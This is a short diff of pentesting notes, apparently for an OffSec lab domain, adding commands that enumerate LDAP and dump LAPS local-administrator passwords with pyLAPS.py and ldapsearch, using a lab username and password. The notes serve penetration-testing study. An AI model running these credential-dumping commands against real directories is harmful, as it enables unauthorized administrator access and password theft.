@@ -478,8 +478,11 @@ ACTIVE DIRECTORY:
 
     before we get in, we can enum ldap:
         ldapsearch -x -H ldap://192.168.241.122 -D '' -w '' -b "DC=hutch,DC=offsec"
-    ldab if we know creds:      
+    ldap after we know creds:      
        python3 pyLAPS.py --dc-ip 192.168.241.122 -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192
+       or
+       ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.241.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+
 
     Enum:
 
